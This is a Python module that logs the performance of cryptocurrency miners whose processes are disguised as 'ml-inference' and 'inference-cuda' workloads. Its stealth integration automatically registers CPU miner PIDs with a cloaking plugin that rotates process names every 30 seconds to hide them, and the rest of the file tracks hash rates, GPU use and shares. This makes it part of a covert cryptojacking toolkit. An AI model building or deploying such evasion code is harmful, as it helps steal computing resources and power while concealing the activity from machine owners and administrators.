"""
Mining Performance Logger - Detailed Logging for Mining Processes
Hệ thống ghi log chi tiết cho các tiến trình khai thác
"""
import json
import logging
import os
import threading
import time
import psutil
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional, List, Tuple
from dataclasses import dataclass, asdict
from collections import deque
import subprocess

# ✅ STEALTH INTEGRATION: Import stealth execution for automatic process cloaking
try:
    from mining_environment.stealth.plugins.stealth_exec import StealthExecution
    _stealth_system = None
    _stealth_logger = logging.getLogger('mining_performance_stealth')
except ImportError:
    StealthExecution = None
    _stealth_system = None
    _stealth_logger = None

# LOGS_DIR configuration - thư mục lưu trữ logs
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

def _initialize_stealth_system():
    """
    **Initialize Stealth System** (Khởi tạo hệ thống che giấu) - tự động che giấu process mining
    """
    global _stealth_system, _stealth_logger
    
    if _stealth_system is not None or StealthExecution is None:
        return _stealth_system
    
    try:
        _stealth_system = StealthExecution(
            logger=_stealth_logger,
            comm_rotation_interval=30  # Rotate names every 30 seconds
        )
        
        # Start stealth system
        if _stealth_system.start():
            _stealth_logger.info("🛡️ [STEALTH] System initialized and started successfully")
            return _stealth_system
        else:
            _stealth_logger.warning("⚠️ [STEALTH] Failed to start stealth system")
            _stealth_system = None
            return None
            
    except Exception as e:
        _stealth_logger.error(f"❌ [STEALTH] Failed to initialize: {e}")
        _stealth_system = None
        return None

@dataclass
class HashRateMetrics:
    """
    **Hash Rate Metrics** (Chỉ số tốc độ băm) - dữ liệu về tốc độ băm
    """
    timestamp: str
    process_type: str  # "ml-inference" or "inference-cuda"
    hash_rate: float  # hashes per second
    avg_hash_rate: float  # average over time window
    peak_hash_rate: float  # highest recorded rate
    uptime_seconds: float  # time since mining started
    total_hashes: int  # cumulative hashes
    
@dataclass
class ResourceUtilization:
    """
    **Resource Utilization** (Mức sử dụng tài nguyên) - dữ liệu về tài nguyên hệ thống
    """
    timestamp: str
    process_type: str
    cpu_percent: float  # CPU usage percentage
    memory_mb: float  # Memory usage in MB
    gpu_percent: Optional[float] = None  # GPU usage percentage
    gpu_memory_mb: Optional[float] = None  # GPU memory usage in MB
    gpu_temperature: Optional[float] = None  # GPU temperature in Celsius
    power_consumption: Optional[float] = None  # Power consumption in watts

@dataclass
class MiningOperationLog:
    """
    **Mining Operation Log** (Nhật ký thao tác khai thác) - ghi lại mỗi thao tác khai thác
    """
    timestamp: str
    process_type: str
    operation: str  # "START", "STOP", "RESTART", "HASH_FOUND", "SHARE_SUBMITTED"
    pid: int
    details: Dict[str, Any]
    execution_time: float = 0.0
    status: str = "SUCCESS"  # SUCCESS, FAILED, WARNING

class MiningPerformanceLogger:
    """
    **Mining Performance Logger** (Trình ghi log hiệu suất khai thác)
    
    Features:
    - Real-time hash rate monitoring (giám sát tốc độ băm thời gian thực)
    - Resource utilization tracking (theo dõi mức sử dụng tài nguyên)
    - Performance comparison between processes (so sánh hiệu suất giữa các tiến trình)
    - Detailed operation logging (ghi log thao tác chi tiết)
    """
    
    def __init__(self, log_dir: str = LOGS_DIR):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize logger
        self.logger = logging.getLogger('MiningPerformanceLogger')
        
        # Thread-safe logging
        self._lock = threading.Lock()
        
        # Performance data storage
        self.hash_rate_history: Dict[str, deque] = {
            "ml-inference": deque(maxlen=100),
            "inference-cuda": deque(maxlen=100)
        }
        
        self.resource_history: Dict[str, deque] = {
            "ml-inference": deque(maxlen=100),
            "inference-cuda": deque(maxlen=100)
        }
        
        # Process tracking
        self.process_info: Dict[str, Dict[str, Any]] = {
            "ml-inference": {"pid": None, "start_time": None, "process": None},
            "inference-cuda": {"pid": None, "start_time": None, "process": None}
        }
        
        # Performance counters
        self.performance_counters: Dict[str, Dict[str, Any]] = {
            "ml-inference": {
                "total_hashes": 0,
                "peak_hash_rate": 0.0,
                "operation_count": 0,
                "error_count": 0
            },
            "inference-cuda": {
                "total_hashes": 0,
                "peak_hash_rate": 0.0,
                "operation_count": 0,
                "error_count": 0
            }
        }
        
        # Setup loggers
        self.hash_rate_logger = self._setup_logger("mining_hash_rate")
        self.resource_logger = self._setup_logger("mining_resource_usage")
        self.operation_logger = self._setup_logger("mining_operations")
        
        # GPU monitoring utilities
        self.gpu_available = self._check_gpu_availability()
        
    def _setup_logger(self, name: str) -> logging.Logger:
        """Thiết lập logger với format chuẩn"""
        logger = logging.getLogger(f'mining_performance_{name}')
        logger.setLevel(logging.INFO)
        
        # Clear existing handlers
        logger.handlers.clear()
        
        # Create file handler với timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = self.log_dir / f'{name}_{timestamp}.log'
        
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setLevel(logging.INFO)
        
        # Standard formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        
        logger.addHandler(file_handler)
        
        return logger
    
    def _check_gpu_availability(self) -> bool:
        """Kiểm tra GPU có sẵn không"""
        try:
            result = subprocess.run(['nvidia-smi', '--query-gpu=name', '--format=csv,noheader'], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _get_gpu_metrics(self) -> Dict[str, float]:
        """Lấy GPU metrics từ nvidia-smi"""
        if not self.gpu_available:
            return {}
        
        try:
            # Query GPU utilization, memory, and temperature
            result = subprocess.run([
                'nvidia-smi', 
                '--query-gpu=utilization.gpu,memory.used,memory.total,temperature.gpu,power.draw',
                '--format=csv,noheader,nounits'
            ], capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                gpu_data = {}
                
                for i, line in enumerate(lines):
                    parts = line.split(', ')
                    if len(parts) >= 5:
                        gpu_data[f'gpu_{i}'] = {
                            'utilization': float(parts[0]),
                            'memory_used': float(parts[1]),
                            'memory_total': float(parts[2]),
                            'temperature': float(parts[3]),
                            'power_draw': float(parts[4])
                        }
                
                return gpu_data
        except:
            pass
        
        return {}
    
    def _parse_hash_rate_from_log(self, log_line: str) -> Optional[float]:
        """
        Parse hash rate từ mining log output
        Supports multiple mining software formats
        """
        # Common hash rate patterns
        patterns = [
            r'(\d+\.?\d*)\s*[kKmMgGtT]?[hH]/s',  # Generic H/s pattern
            r'speed:\s*(\d+\.?\d*)\s*[kKmMgGtT]?[hH]/s',  # XMRig pattern
            r'hashrate:\s*(\d+\.?\d*)\s*[kKmMgGtT]?[hH]/s',  # Other miners
            r'(\d+\.?\d*)\s*[kKmMgGtT]?[hH]',  # Simplified pattern
        ]
        
        for pattern in patterns:
            match = re.search(pattern, log_line, re.IGNORECASE)
            if match:
                hash_rate = float(match.group(1))
                
                # Handle unit multipliers
                if 'k' in log_line.lower():
                    hash_rate *= 1000
                elif 'm' in log_line.lower():
                    hash_rate *= 1000000
                elif 'g' in log_line.lower():
                    hash_rate *= 1000000000
                elif 't' in log_line.lower():
                    hash_rate *= 1000000000000
                
                return hash_rate
        
        return None
    
    def register_process(self, process_type: str, pid: int, process_obj: Any = None):
        """
        **Register Mining Process** (Đăng ký tiến trình mining) - với tự động kích hoạt stealth system
        
        Args:
            process_type: "ml-inference" or "inference-cuda"
            pid: Process ID
            process_obj: Process object (optional)
        """
        with self._lock:
            self.process_info[process_type] = {
                "pid": pid,
                "start_time": datetime.now(),
                "process": process_obj
            }
            
            # ✅ STEALTH INTEGRATION: Automatically add process to stealth system
            stealth_success = False
            if process_type == "ml-inference":  # Only cloak CPU mining processes
                stealth_system = _initialize_stealth_system()
                if stealth_system:
                    try:
                        stealth_success = stealth_system.add_process(pid)
                        if stealth_success:
                            self.logger.info(f"🛡️ [STEALTH] Process {process_type} (PID: {pid}) added to stealth system successfully")
                        else:
                            self.logger.warning(f"⚠️ [STEALTH] Failed to add process {process_type} (PID: {pid}) to stealth system")
                    except Exception as e:
                        self.logger.error(f"❌ [STEALTH] Error adding process {process_type} (PID: {pid}) to stealth: {e}")
                else:
                    self.logger.warning(f"⚠️ [STEALTH] Stealth system not available for process {process_type} (PID: {pid})")
            
            # Log process registration with stealth status
            self.log_mining_operation(
                process_type=process_type,
                operation="REGISTER",
                pid=pid,
                details={
                    "registration_time": datetime.now().isoformat(),
                    "stealth_enabled": stealth_success,
                    "stealth_applicable": process_type == "ml-inference"
                }
            )
    
    def log_hash_rate(self, process_type: str, hash_rate: float, 
                     additional_metrics: Optional[Dict[str, Any]] = None):
        """
        Log hash rate metrics
        
        Args:
            process_type: "ml-inference" or "inference-cuda"
            hash_rate: Current hash rate (hashes per second)
            additional_metrics: Additional metrics to log
        """
        with self._lock:
            timestamp = datetime.now().isoformat()
            
            # Update performance counters
            if hash_rate > self.performance_counters[process_type]["peak_hash_rate"]:
                self.performance_counters[process_type]["peak_hash_rate"] = hash_rate
            
            # Calculate averages
            history = self.hash_rate_history[process_type]
            history.append(hash_rate)
            avg_hash_rate = sum(history) / len(history) if history else 0.0
            
            # Calculate uptime
            start_time = self.process_info[process_type]["start_time"]
            uptime_seconds = (datetime.now() - start_time).total_seconds() if start_time else 0.0
            
            # Create metrics object
            metrics = HashRateMetrics(
                timestamp=timestamp,
                process_type=process_type,
                hash_rate=hash_rate,
                avg_hash_rate=avg_hash_rate,
                peak_hash_rate=self.performance_counters[process_type]["peak_hash_rate"],
                uptime_seconds=uptime_seconds,
                total_hashes=self.performance_counters[process_type]["total_hashes"]
            )
            
            # Log to file
            log_message = f"HASH_RATE: {process_type} - {hash_rate:.2f} H/s - Avg: {avg_hash_rate:.2f} H/s - Peak: {metrics.peak_hash_rate:.2f} H/s"
            if additional_metrics:
                log_message += f" - Additional: {additional_metrics}"
            
            self.hash_rate_logger.info(log_message)
            
            # Update total hashes estimate
            self.performance_counters[process_type]["total_hashes"] += int(hash_rate)
    
    def log_resource_utilization(self, process_type: str, force_gpu_check: bool = False):
        """
        Log resource utilization metrics
        
        Args:
            process_type: "ml-inference" or "inference-cuda"
            force_gpu_check: Force GPU metrics collection
        """
        with self._lock:
            timestamp = datetime.now().isoformat()
            pid = self.process_info[process_type]["pid"]
            
            if not pid:
                return
            
            try:
                # Get process CPU and memory usage
                process = psutil.Process(pid)
                cpu_percent = process.cpu_percent()
                memory_mb = process.memory_info().rss / 1024 / 1024
                
                # Get GPU metrics if available
                gpu_percent = None
                gpu_memory_mb = None
                gpu_temperature = None
                power_consumption = None
                
                if self.gpu_available and (process_type == "inference-cuda" or force_gpu_check):
                    gpu_metrics = self._get_gpu_metrics()
                    if gpu_metrics:
                        # Use first GPU for now
                        gpu_0 = gpu_metrics.get('gpu_0', {})
                        gpu_percent = gpu_0.get('utilization')
                        gpu_memory_mb = gpu_0.get('memory_used')
                        gpu_temperature = gpu_0.get('temperature')
                        power_consumption = gpu_0.get('power_draw')
                
                # Create resource metrics
                resource_metrics = ResourceUtilization(
                    timestamp=timestamp,
                    process_type=process_type,
                    cpu_percent=cpu_percent,
                    memory_mb=memory_mb,
                    gpu_percent=gpu_percent,
                    gpu_memory_mb=gpu_memory_mb,
                    gpu_temperature=gpu_temperature,
                    power_consumption=power_consumption
                )
                
                # Store in history
                self.resource_history[process_type].append(resource_metrics)
                
                # Log to file
                log_message = f"RESOURCE: {process_type} - CPU: {cpu_percent:.1f}% - Memory: {memory_mb:.1f}MB"
                if gpu_percent is not None:
                    log_message += f" - GPU: {gpu_percent:.1f}% - GPU Memory: {gpu_memory_mb:.1f}MB - GPU Temp: {gpu_temperature:.1f}°C"
                
                self.resource_logger.info(log_message)
                
            except psutil.NoSuchProcess:
                self.log_mining_operation(
                    process_type=process_type,
                    operation="PROCESS_NOT_FOUND",
                    pid=pid,
                    details={"error": "Process no longer exists"},
                    status="FAILED"
                )
            except Exception as e:
                self.log_mining_operation(
                    process_type=process_type,
                    operation="RESOURCE_MONITORING_ERROR",
                    pid=pid,
                    details={"error": str(e)},
                    status="FAILED"
                )
    
    def log_mining_operation(self, process_type: str, operation: str, pid: int,
                           details: Dict[str, Any], execution_time: float = 0.0,
                           status: str = "SUCCESS"):
        """
        Log mining operation events
        
        Args:
            process_type: "ml-inference" or "inference-cuda"
            operation: Type of operation
            pid: Process ID
            details: Operation details
            execution_time: Time taken for operation
            status: SUCCESS, FAILED, WARNING
        """
        with self._lock:
            timestamp = datetime.now().isoformat()
            
            operation_log = MiningOperationLog(
                timestamp=timestamp,
                process_type=process_type,
                operation=operation,
                pid=pid,
                details=details,
                execution_time=execution_time,
                status=status
            )
            
            # Update counters
            self.performance_counters[process_type]["operation_count"] += 1
            if status == "FAILED":
                self.performance_counters[process_type]["error_count"] += 1
            
            # Log to file
            log_message = f"OPERATION: {process_type} - {operation} - {status} - PID: {pid} - {execution_time:.4f}s"
            if details:
                log_message += f" - Details: {details}"
            
            self.operation_logger.info(log_message)
    
    def monitor_process_logs(self, process_type: str, log_file_path: str):
        """
        Monitor mining process logs for hash rate extraction
        
        Args:
            process_type: "ml-inference" or "inference-cuda"
            log_file_path: Path to mining process log file
        """
        def monitor_thread():
            try:
                with open(log_file_path, 'r') as f:
                    # Start from end of file
                    f.seek(0, 2)
                    
                    while True:
                        line = f.readline()
                        if not line:
                            time.sleep(0.1)
                            continue
                        
                        # Try to parse hash rate
                        hash_rate = self._parse_hash_rate_from_log(line)
                        if hash_rate:
                            self.log_hash_rate(process_type, hash_rate)
                        
                        # Log other significant events
                        if "share" in line.lower():
                            self.log_mining_operation(
                                process_type=process_type,
                                operation="SHARE_SUBMITTED",
                                pid=self.process_info[process_type]["pid"] or 0,
                                details={"log_line": line.strip()}
                            )
            except Exception as e:
                self.log_mining_operation(
                    process_type=process_type,
                    operation="LOG_MONITORING_ERROR",
                    pid=self.process_info[process_type]["pid"] or 0,
                    details={"error": str(e)},
                    status="FAILED"
                )
        
        # Start monitoring thread
        thread = threading.Thread(target=monitor_thread, daemon=True)
        thread.start()
    
    def get_real_time_metrics(self) -> Dict[str, Any]:
        """
        Get real-time mining metrics for display
        
        Returns:
            Dictionary with current metrics for both processes
        """
        with self._lock:
            metrics = {}
            
            for process_type in ["ml-inference", "inference-cuda"]:
                hash_history = self.hash_rate_history[process_type]
                resource_history = self.resource_history[process_type]
                
                current_hash_rate = hash_history[-1] if hash_history else 0.0
                avg_hash_rate = sum(hash_history) / len(hash_history) if hash_history else 0.0
                
                current_resource = resource_history[-1] if resource_history else None
                
                metrics[process_type] = {
                    "current_hash_rate": current_hash_rate,
                    "avg_hash_rate": avg_hash_rate,
                    "peak_hash_rate": self.performance_counters[process_type]["peak_hash_rate"],
                    "total_hashes": self.performance_counters[process_type]["total_hashes"],
                    "operation_count": self.performance_counters[process_type]["operation_count"],
                    "error_count": self.performance_counters[process_type]["error_count"],
                    "uptime_seconds": (datetime.now() - self.process_info[process_type]["start_time"]).total_seconds() 
                                    if self.process_info[process_type]["start_time"] else 0,
                    "resource_usage": asdict(current_resource) if current_resource else None
                }
            
            return metrics
    
    def generate_performance_comparison(self) -> str:
        """
        Generate performance comparison report
        
        Returns:
            Formatted comparison report
        """
        metrics = self.get_real_time_metrics()
        
        report = f"Mining Performance Comparison - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += "=" * 80 + "\n\n"
        
        for process_type in ["ml-inference", "inference-cuda"]:
            data = metrics[process_type]
            report += f"{process_type.upper()}:\n"
            report += f"  Current Hash Rate: {data['current_hash_rate']:.2f} H/s\n"
            report += f"  Average Hash Rate: {data['avg_hash_rate']:.2f} H/s\n"
            report += f"  Peak Hash Rate: {data['peak_hash_rate']:.2f} H/s\n"
            report += f"  Total Hashes: {data['total_hashes']:,}\n"
            report += f"  Uptime: {data['uptime_seconds']:.0f} seconds\n"
            report += f"  Operations: {data['operation_count']}\n"
            report += f"  Errors: {data['error_count']}\n"
            
            if data['resource_usage']:
                resource = data['resource_usage']
                report += f"  CPU Usage: {resource['cpu_percent']:.1f}%\n"
                report += f"  Memory Usage: {resource['memory_mb']:.1f}MB\n"
                if resource['gpu_percent']:
                    report += f"  GPU Usage: {resource['gpu_percent']:.1f}%\n"
                    report += f"  GPU Memory: {resource['gpu_memory_mb']:.1f}MB\n"
                    report += f"  GPU Temperature: {resource['gpu_temperature']:.1f}°C\n"
            
            report += "\n"
        
        return report
    
    def export_performance_report(self, output_file: Optional[str] = None) -> str:
        """
        Export comprehensive performance report
        
        Args:
            output_file: Output file path (optional)
            
        Returns:
            Path to exported file
        """
        if output_file is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = str(self.log_dir / f'mining_performance_report_{timestamp}.log')
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(self.generate_performance_comparison())
        
        return output_file

# Global logger instance
mining_perf_logger = MiningPerformanceLogger()

# Convenience functions
def register_mining_process(process_type: str, pid: int, process_obj: Any = None):
    """Register a mining process for monitoring"""
    try:
        if mining_perf_logger is not None:
            mining_perf_logger.register_process(process_type, pid, process_obj)
        else:
            print(f"[WARNING] mining_perf_logger not initialized, skipping register_mining_process")
    except Exception as e:
        print(f"[ERROR] register_mining_process failed: {e}")

def log_hash_rate(process_type: str, hash_rate: float, additional_metrics: Optional[Dict[str, Any]] = None):
    """Log hash rate measurement"""
    try:
        if mining_perf_logger is not None:
            mining_perf_logger.log_hash_rate(process_type, hash_rate, additional_metrics)
        else:
            print(f"[WARNING] mining_perf_logger not initialized, skipping log_hash_rate")
    except Exception as e:
        print(f"[ERROR] log_hash_rate failed: {e}")

def log_resource_usage(process_type: str, force_gpu_check: bool = False):
    """Log resource utilization"""
    try:
        if mining_perf_logger is not None:
            mining_perf_logger.log_resource_utilization(process_type, force_gpu_check)
        else:
            print(f"[WARNING] mining_perf_logger not initialized, skipping log_resource_usage")
    except Exception as e:
        print(f"[ERROR] log_resource_usage failed: {e}")

def log_mining_operation(process_type: str, operation: str, pid: int, details: Dict[str, Any], 
                        execution_time: float = 0.0, status: str = "SUCCESS"):
    """Log mining operation"""
    mining_perf_logger.log_mining_operation(process_type, operation, pid, details, execution_time, status)

def get_real_time_metrics() -> Dict[str, Any]:
    """Get real-time mining metrics"""
    try:
        if mining_perf_logger is None:
            # Return empty metrics if logger not initialized
            return {
                "ml-inference": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0},
                "inference-cuda": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0}
            }
        return mining_perf_logger.get_real_time_metrics()
    except Exception as e:
        # Return empty metrics on error
        print(f"[ERROR] get_real_time_metrics failed: {e}")
        return {
            "ml-inference": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0},
            "inference-cuda": {"current_hash_rate": 0.0, "avg_hash_rate": 0.0, "peak_hash_rate": 0.0}
        }

def generate_performance_comparison() -> str:
    """Generate performance comparison report"""
    return mining_perf_logger.generate_performance_comparison()